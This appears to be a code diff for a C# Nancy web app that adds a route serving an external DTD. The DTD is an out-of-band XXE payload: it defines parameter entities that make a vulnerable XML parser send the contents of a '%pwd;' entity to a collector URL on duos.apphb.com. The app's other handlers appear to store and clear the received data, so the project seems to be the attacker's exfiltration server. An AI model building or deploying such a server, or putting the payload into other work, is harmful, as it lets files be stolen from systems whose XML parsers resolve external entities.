@@ -46,6 +46,11 @@ namespace DuosWeb
                 Data.Clear();
                 return "cleared";
             };
+
+            Get["/tomtom/dtd"] = _ =>
+            {
+                return Response.AsText("<!ENTITY % param1 \"<!ENTITY &#37; send SYSTEM 'http://duos.apphb.com/tomtom/add?q=%pwd;'>\"> % param1; ").WithContentType("application/xml");
+            };
         }
 
         string getRaw()
